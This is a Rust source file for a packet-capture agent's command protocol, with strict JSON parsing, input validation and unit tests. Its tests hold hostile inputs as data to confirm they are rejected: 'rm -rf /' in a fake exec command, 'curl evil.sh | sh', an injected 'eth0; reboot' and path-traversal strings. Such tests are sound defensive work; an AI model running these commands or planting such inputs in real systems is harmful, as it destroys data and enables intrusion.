use serde::{Deserialize, Serialize};
use thiserror::Error;

pub const PCAP_SNAPLEN_MAX: u16 = 128;
pub const SEGMENT_INTERVAL_MIN_SECS: u32 = 60;
pub const SEGMENT_INTERVAL_MAX_SECS: u32 = 3600;
pub const BPF_FILTER_MAX_LEN: usize = 1024;
pub const INTERFACE_NAME_MAX_LEN: usize = 15;
pub const MISSION_ID_MAX_LEN: usize = 64;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ServerMessage {
    pub id: u64,
    pub command: ServerCommand,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case", deny_unknown_fields)]
pub enum ServerCommand{
    Config(MissionConfig),
    Start {},
    Finish {},
    Status {},
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct MissionConfig {
    pub mission_id: String,
    pub interface: String,
    pub bpf_filter: Option<String>,
    pub pcap_enabled: bool,
    pub pcap_snaplen: u16,
    pub segment_interval_secs: u32,
}

#[derive(Debug,Clone,PartialEq,Eq,Error)]
pub enum ConfigError{
    #[error("invalid mission Id")]
    InvalidMissionId,
    #[error("Invalid interface name")]
    InvalidInterface,
    #[error("BPF filter too long (max {BPF_FILTER_MAX_LEN})")]
    BpfFilterTooLong,
    #[error("pcap_snaplen must be between 1 and {PCAP_SNAPLEN_MAX}")]
    InvalidPcapSnaplen,
    #[error("segment_interval_secs must be between {SEGMENT_INTERVAL_MIN_SECS} and {SEGMENT_INTERVAL_MAX_SECS} ")]
    InvalidSegmentInterval,
}

impl MissionConfig {
    pub fn validate(&self) -> Result<(), ConfigError> {
        if !is_valid_token(&self.mission_id, MISSION_ID_MAX_LEN, &['-', '_']) {
            return Err(ConfigError::InvalidMissionId);
        }
        if !is_valid_token(&self.interface, INTERFACE_NAME_MAX_LEN, &['-', '_', '.']) {
            return Err(ConfigError::InvalidInterface);
        }
        if self
            .bpf_filter
            .as_ref()
            .is_some_and(|f| f.len() > BPF_FILTER_MAX_LEN)
        {
            return Err(ConfigError::BpfFilterTooLong);
        }
        if self.pcap_snaplen == 0 || self.pcap_snaplen > PCAP_SNAPLEN_MAX {
            return Err(ConfigError::InvalidPcapSnaplen);
        }
        if !(SEGMENT_INTERVAL_MIN_SECS..=SEGMENT_INTERVAL_MAX_SECS)
            .contains(&self.segment_interval_secs)
        {
            return Err(ConfigError::InvalidSegmentInterval);
        }
        Ok(())
    }
}

fn is_valid_token(value: &str, max_len: usize, extra: &[char]) -> bool {
    !value.is_empty()
        && value.len() <= max_len
        && value
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || extra.contains(&c))
}
#[cfg(test)]
mod tests{
    use super::*;


#[test]
fn read_known_command(){
    let cmd: ServerCommand = serde_json::from_str(r#"{"type":"start"}"#).unwrap();
    assert_eq!(cmd, ServerCommand::Start {});
}

#[test]
fn read_unknown_command_and_refuse(){
    let result = serde_json::from_str::<ServerCommand>(r#"{"type":"exec","cmd":"rm -rf /"}"#);
    assert!(result.is_err());

}

#[test]
fn read_too_much_field(){
    let result = serde_json::from_str::<ServerCommand>(r#"{"type":"start","now":true}"#);
    assert!(result.is_err());
}

#[test]
fn read_config_field() {
    let json = r#"{
    "type": "config",
    "mission_id": "m-01",
    "interface": "eth0",
    "bpf_filter": null,
    "pcap_enabled": false,
    "pcap_snaplen": 128,
    "segment_interval_secs": 600
}"#;
    let cmd: ServerCommand = serde_json::from_str(json).unwrap();
    let ServerCommand::Config(config) = cmd else {
        panic!("config expected");
    };
    assert_eq!(config.interface, "eth0");
    assert_eq!(config.bpf_filter, None);
    assert_eq!(config.segment_interval_secs, 600);
}

#[test]
fn read_incorrect_config() {
    let json = r#"{
    "type": "config",
    "mission_id": "m-01",
    "interface": "eth0",
    "bpf_filter": null,
    "pcap_enabled": false,
    "pcap_snaplen": 128,
    "segment_interval_secs": 600,
    "script": "curl evil.sh | sh"
}"#;
    assert!(serde_json::from_str::<ServerCommand>(json).is_err());
}

#[test]
fn read_incomplete_command() {
    let json = r#"{"type": "config", "mission_id": "m-01", "interface": "eth0"}"#;
    assert!(serde_json::from_str::<ServerCommand>(json).is_err());
}

fn valid_config() -> MissionConfig {
    MissionConfig {
        mission_id: "m-2026-11-18_01".into(),
        interface: "eth0".into(),
        bpf_filter: None,
        pcap_enabled: false,
        pcap_snaplen: 128,
        segment_interval_secs: 600,
    }
}

#[test]
fn valid_config_accepted() {
    assert_eq!(valid_config().validate(), Ok(()));
}

#[test]
fn refuse_invalid_snaplen() {
    for snaplen in [0, 129, 1500] {
        let config = MissionConfig { pcap_snaplen: snaplen, ..valid_config() };
        assert_eq!(config.validate(), Err(ConfigError::InvalidPcapSnaplen), "snaplen {snaplen}");
    }
}

#[test]
fn refuse_interval_out_of_bounds() {
    for secs in [0, 59, 3601] {
        let config = MissionConfig { segment_interval_secs: secs, ..valid_config() };
        assert_eq!(config.validate(), Err(ConfigError::InvalidSegmentInterval), "intervalle {secs}");
    }
}

#[test]
fn refuse_invalid_interface() {
    for bad in ["", "eth0; reboot", "../etc", "a too long interface"] {
        let config = MissionConfig { interface: bad.into(), ..valid_config() };
        assert_eq!(config.validate(), Err(ConfigError::InvalidInterface), "interface {bad:?}");
    }
}

#[test]
fn refuse_invalid_mission_id() {
    for bad in ["", "m 1", "../../root", &"x".repeat(65)] {
        let config = MissionConfig { mission_id: bad.into(), ..valid_config() };
        assert_eq!(config.validate(), Err(ConfigError::InvalidMissionId), "mission_id {bad:?}");
    }
}

#[test]
fn refuse_too_long_filter() {
    let config = MissionConfig {
        bpf_filter: Some("a".repeat(BPF_FILTER_MAX_LEN + 1)),
        ..valid_config()
    };
    assert_eq!(config.validate(), Err(ConfigError::BpfFilterTooLong));
}

#[test]
fn read_command_id() {
    let msg: ServerMessage =
        serde_json::from_str(r#"{"id": 7, "command": {"type": "start"}}"#).unwrap();
    assert_eq!(msg.id, 7);
    assert_eq!(msg.command, ServerCommand::Start {});
}

#[test]
fn refuse_a_command_without_an_id() {
    let result = serde_json::from_str::<ServerMessage>(r#"{"command": {"type": "start"}}"#);
    assert!(result.is_err());
}

#[test]
fn refuse_an_incorrect_command() {
    let result = serde_json::from_str::<ServerMessage>(
        r#"{"id": 7, "command": {"type": "start"}, "extra": 1}"#,
    );
    assert!(result.is_err());
}

#[test]
fn refuse_a_command_with_incorrect_config() {
    let result = serde_json::from_str::<ServerMessage>(
        r#"{"id": 7, "command": {"type": "exec", "cmd": "rm -rf /"}}"#,
    );
    assert!(result.is_err());
}

}